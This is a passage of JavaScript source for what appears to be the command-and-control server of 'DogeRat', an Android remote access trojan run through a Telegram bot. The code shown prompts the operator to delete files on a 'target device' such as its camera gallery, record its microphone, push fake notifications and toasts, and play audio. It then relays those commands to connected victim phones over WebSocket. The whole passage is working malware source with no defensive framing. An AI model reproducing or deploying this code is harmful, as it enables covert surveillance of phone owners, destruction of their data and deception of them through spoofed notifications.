                '°• 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚙𝚊𝚝𝚑 𝚘𝚏 𝚝𝚑𝚎 𝚏𝚒𝚕𝚎 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚍𝚎𝚕𝚎𝚝𝚎\n\n' +
                '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('Error:', err.message));
            currentUuid = uuid;
        },
        'microphone': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• 𝙴𝚗𝚝𝚎𝚛 𝚑𝚘𝚠 𝚕𝚘𝚗𝚐 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚖𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 𝚝𝚘 𝚋𝚎 𝚛𝚎𝚌𝚘𝚛𝚍𝚎𝚍\n\n' +
                '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('Error:', err.message));
            currentUuid = uuid;
        },
        'toast': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚘𝚗 𝚝𝚑𝚎 𝚝𝚊𝚛𝚐𝚎𝚝 𝚍𝚎𝚟𝚒𝚌𝚎\n\n' +
                '• ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀꜱ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('Error:', err.message));
            currentUuid = uuid;
        },
        'show_notification': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚊𝚜 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗\n\n' +
                '• ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('Error:', err.message));
            currentUuid = uuid;
        },
        'play_audio': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚊𝚞𝚍𝚒𝚘 𝚕𝚒𝚗𝚔 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚙𝚕𝚊𝚢\n\n' +
                '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('Error:', err.message));
            currentUuid = uuid;
        }
    };

    if (commandHandlers[commend]) {
        commandHandlers[commend]();
    }
}

function sendToDevice(uuid, command) {
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid === uuid) {
            ws.send(command);
        }
    });
}

function deleteAndSendProcessing(messageId) {
    if (appBot && id) {
        appBot.deleteMessage(id, messageId).catch(() => {});
        sendProcessingMessage();
    }
}

function sendProcessingMessage() {
    if (appBot && id) {
        appBot.sendMessage(id,
            '°• 𝚈𝚘𝚞𝚛 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚒𝚜 𝚘𝚗 𝚙𝚛𝚘𝚌𝚎𝚜𝚜\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        ).catch(err => console.error('Error:', err.message));
    }
}

// Keep-alive ping
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping');
    });
    
    // Optional: Keep server awake by pinging external service
    if (address) {
        axios.get(address).catch(() => {
            // Ignore errors from ping
        });
    }
}, 5000);

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('SIGTERM signal received: closing HTTP server');
    appServer.close(() => {
        console.log('HTTP server closed');
        process.exit(0);
    });
});

process.on('SIGINT', () => {
    console.log('SIGINT signal received: closing HTTP server');
    appServer.close(() => {
        console.log('HTTP server closed');
        process.exit(0);
    });
});

// Start server
appServer.listen(PORT, () => {
    console.log(`DogeRat Server v1.0.0 running on port ${PORT}`);
    console.log(`Connected devices will appear here`);
});
